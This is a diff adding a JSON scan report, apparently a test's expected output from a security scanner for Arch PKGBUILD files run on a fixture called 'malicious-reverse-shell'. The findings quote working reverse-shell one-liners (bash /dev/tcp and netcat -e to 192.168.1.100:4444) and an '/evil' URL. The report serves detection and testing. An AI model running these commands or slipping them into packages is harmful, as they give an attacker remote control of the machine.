@@ -1,0 +1,81 @@
+{
+  "package_name": "malicious-reverse-shell",
+  "package_version": "1.0.0-1",
+  "findings": [
+    {
+      "id": "SHELL-001",
+      "severity": "critical",
+      "category": "malicious_code",
+      "title": "Bash reverse shell",
+      "description": "Pattern indicates a bash reverse shell connection",
+      "location": {
+        "file": "tests/fixtures/malicious/reverse-shell/PKGBUILD",
+        "line": 14,
+        "column": 16,
+        "snippet": "    bash -i >& /dev/tcp/192.168.1.100/4444 0>&1"
+      },
+      "recommendation": "Remove reverse shell code immediately",
+      "cwe_id": "CWE-506",
+      "metadata": {
+        "matched_text": "/dev/tcp/192.168.1.100/4444"
+      }
+    },
+    {
+      "id": "SHELL-002",
+      "severity": "critical",
+      "category": "malicious_code",
+      "title": "Netcat reverse shell",
+      "description": "Netcat with execute flag indicates reverse shell",
+      "location": {
+        "file": "tests/fixtures/malicious/reverse-shell/PKGBUILD",
+        "line": 19,
+        "column": 5,
+        "snippet": "    nc -e /bin/sh 192.168.1.100 4444"
+      },
+      "recommendation": "Remove reverse shell code immediately",
+      "cwe_id": "CWE-506",
+      "metadata": {
+        "matched_text": "nc -e "
+      }
+    },
+    {
+      "id": "URL-001",
+      "severity": "high",
+      "category": "network_security",
+      "title": "Raw IP in URL",
+      "description": "URLs with raw IP addresses are suspicious",
+      "location": {
+        "file": "tests/fixtures/malicious/reverse-shell/PKGBUILD",
+        "line": 9,
+        "column": 6,
+        "snippet": "url=\"http://192.168.1.100/evil\""
+      },
+      "recommendation": "Use domain names from trusted sources",
+      "cwe_id": null,
+      "metadata": {
+        "matched_text": "http://192.168.1.100"
+      }
+    },
+    {
+      "id": "SRC-005",
+      "severity": "medium",
+      "category": "configuration",
+      "title": "No sources with build function",
+      "description": "Package has build() function but no source array",
+      "location": {
+        "file": "tests/fixtures/malicious/reverse-shell/PKGBUILD",
+        "line": null,
+        "column": null,
+        "snippet": null
+      },
+      "recommendation": "Verify this is intentional; build() usually needs sources",
+      "cwe_id": null,
+      "metadata": {}
+    }
+  ],
+  "scanned_files": [
+    "tests/fixtures/malicious/reverse-shell/PKGBUILD"
+  ],
+  "timestamp": "2026-06-15T13:48:50.142019448Z",
+  "scan_duration_ms": 5
+}
